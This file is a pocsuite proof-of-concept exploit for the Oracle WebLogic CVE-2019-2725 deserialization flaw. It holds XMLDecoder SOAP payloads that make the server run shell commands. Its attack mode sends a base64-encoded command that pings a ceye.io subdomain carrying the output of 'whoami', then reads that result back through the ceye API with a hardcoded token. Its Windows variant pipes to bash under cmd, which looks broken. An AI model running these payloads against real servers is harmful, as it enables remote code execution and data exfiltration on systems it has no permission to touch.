#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    name = 'Weblogic wls9_async_response Command Execution '
    vulID = '0'
    author = ['LRestless']
    vulType = 'cmd-exec'
    version = '1'
    references = ['']
    desc = '''CVE-2019-2725/CNVD-C-2019-48814 Weblogic wls9_async_response'''

    vulDate = '2019-04-17'
    createDate = '2019-05-07'
    updateDate = '2019-04-07'

    appName = 'Weblogic'
    appVersion = '10.*/12.1.3'
    appPowerLink = 'https://www.oracle.com/middleware/technologies/weblogic.html'

    payload_linux = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
        <soapenv:Header>
            <wsa:Action>demoAction</wsa:Action>
            <wsa:RelatesTo>hello</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.8" class="java.beans.xmlDecoder">
                    <void class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>/bin/sh</string>
                            </void>
                            <void index="1">
                                <string>-c</string>
                            </void>
                            <void index="2">
                                <string>{0}</string>
                            </void>
                        </array>
                        <void method="start"/></void>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
            <asy:onAsyncDelivery/>
        </soapenv:Body>
    </soapenv:Envelope>
        '''
    payload_win = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
        <soapenv:Header>
            <wsa:Action>demoAction</wsa:Action>
            <wsa:RelatesTo>hello</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.8" class="java.beans.xmlDecoder">
                    <void class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>cmd</string>
                            </void>
                            <void index="1">
                                <string>/c</string>
                            </void>
                            <void index="2">
                                <string>{0}</string>
                            </void>
                        </array>
                        <void method="start"/></void>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
            <asy:onAsyncDelivery/>
        </soapenv:Body>
    </soapenv:Envelope>
        '''

    def verify_result(self):
        url = "http://api.ceye.io/v1/records?token=02f0dbce38f1ab6515c2042644617d0b&type=dns&filter=weblogic"
        try:
            resp = req.get(url, timeout=30)
            retext = re.compile(r'data":.*?name": "(.*?)",')
            if resp.content:
                return re.findall(retext, resp.content)[0].split('.')[0]
        except Exception:
            pass
        return False

    def _attack(self):
        """attack mode"""
        result = {}
        filename = "/_async/AsyncResponseService"
        url = self.url.strip('/') + filename
        print(url)
        headers = {'content-type': 'text/xml'}
        #--ping `whoami`.weblogic.xxxxxx.ceye.io--
        cmd_linux = 'echo cGluZyBgd2hvYW1pYC53ZWJsb2dpYy42ZmJwaWMuY2V5ZS5pbw==|base64 -d|bash'
        cmd_win = 'echo cGluZyBMTEwud2VibG9naWMuNmZicGljLmNleWUuaW8=|base64 -d|bash'
        data_liunx = self.payload_linux.format(cmd_linux)
        #print(data_liunx)
        data_win = self.payload_win.format(cmd_win)
        r1 = req.post(url, data=data_liunx, headers=headers, timeout=7)
        r2 = req.post(url, data=data_win, headers=headers, timeout=7)
        if r1.status_code == 202 or r2.status_code == 202:
            whoami = self.verify_result()
            if whoami:
                result['extra'] = {}
                result['extra']['whoami'] = whoami
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        filename = "/_async/AsyncResponseService"
        self.url = self.url.strip('/') + filename
        headers = {'content-type': 'text/xml'}
        # flag = ''.join(random.choices(string.ascii_letters) for _ in xrange(0, 8))
        # flag = flag.lower()
        cmd = 'echo d2hvYW1p|base64 -d|bash'
        data_linux = self.payload_linux.format(cmd)
        data_win = self.payload_win.format(cmd)
        r1 = req.post(self.url, data=data_linux, headers=headers, timeout=7)
        r2 = req.post(self.url, data=data_win, headers=headers, timeout=7)
        if r1.status_code == 202 or r2.status_code == 202:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

